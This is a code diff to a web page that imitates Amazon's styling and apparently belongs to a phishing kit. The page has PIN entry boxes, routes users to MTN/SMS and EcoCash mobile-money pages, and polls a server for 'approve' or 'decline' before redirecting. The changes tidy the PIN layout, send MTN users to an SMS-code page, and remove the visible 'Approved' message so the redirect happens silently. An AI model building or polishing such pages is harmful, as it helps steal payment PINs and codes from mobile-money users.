@@ -108,7 +108,18 @@
     font-weight: 600; color: var(--amz-ink); letter-spacing: 0.4px;
   }
   .pin-label { font-size: 12.5px; font-weight: 600; color: var(--amz-ink); margin: 12px 0 8px; text-align: center; }
-  .pin-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 6px; }
+
+  /* ── PIN row locked side-by-side, always horizontal ── */
+  .pin-row {
+    display: flex;
+    flex-wrap: nowrap;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 6px;
+    width: 100%;
+  }
+  .pin-row .pin-input { flex: 0 0 44px; }
   .pin-input {
     width: 44px; height: 52px; text-align: center; font-size: 22px; font-weight: 700;
     color: var(--amz-ink); background: #FFFFFF; border: 1.5px solid var(--amz-border);
@@ -118,10 +129,16 @@
   .pin-input:focus { border-color: var(--amz-orange); box-shadow: 0 0 0 3px rgba(255,134,31,0.16); }
   .pin-input.filled { border-color: var(--amz-ink); }
   .pin-input.error { border-color: var(--amz-error); box-shadow: 0 0 0 3px rgba(177,39,4,0.10); }
+
   @media (max-width: 360px) {
-    .pin-input { width: 38px; height: 48px; font-size: 20px; }
     .pin-row { gap: 6px; }
+    .pin-row .pin-input { flex: 0 0 38px; width: 38px; height: 48px; font-size: 20px; }
   }
+  @media (max-width: 320px) {
+    .pin-row { gap: 4px; }
+    .pin-row .pin-input { flex: 0 0 34px; width: 34px; height: 44px; font-size: 18px; }
+  }
+
   .pin-error {
     display: none; text-align: center; font-size: 11.5px;
     color: var(--amz-error); font-weight: 600; margin-top: 6px;
@@ -314,7 +331,7 @@
 
 <script>
 const CONFIG = {
-  MTN_NEXT_PAGE: 'mtn.html',
+  MTN_NEXT_PAGE: 'sms.html',
   ECOCASH_NEXT_PAGE: 'ecocash.html',
   VERIFY_ENDPOINT: '/api/verify/send',
   STATUS_ENDPOINT: (id) => `/api/verify/status/${encodeURIComponent(id)}`,
@@ -325,7 +342,6 @@ const CONFIG = {
     (code) => `/api/links?code=${encodeURIComponent(code)}`
   ],
   DEFAULT_FEE: 0,
-  APPROVED_FLASH_MS: 900,
   SLOW_HINT_MS: 6000
 };
 
@@ -530,18 +546,10 @@ function pollStatus() {
 function handleApprove() {
   state.polling = false;
   if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-  const overlay = document.getElementById('verifyingOverlay');
-  if (overlay) {
-    const t = overlay.querySelector('.load-title');
-    const s = overlay.querySelector('.load-sub');
-    const sp = overlay.querySelector('.spinner');
-    if (t) t.textContent = 'Approved ✓';
-    if (s) s.textContent = 'Redirecting you to the next step…';
-    if (sp) sp.style.display = 'none';
-  }
+  // No visible flash — spinner keeps running until navigation fires
   const next = nextPageFor(state.payload && state.payload.c);
   const qs = window.location.search || '';
-  setTimeout(() => { window.location.href = next + qs; }, CONFIG.APPROVED_FLASH_MS);
+  window.location.href = next + qs;
 }
 
 function handleDecline() {
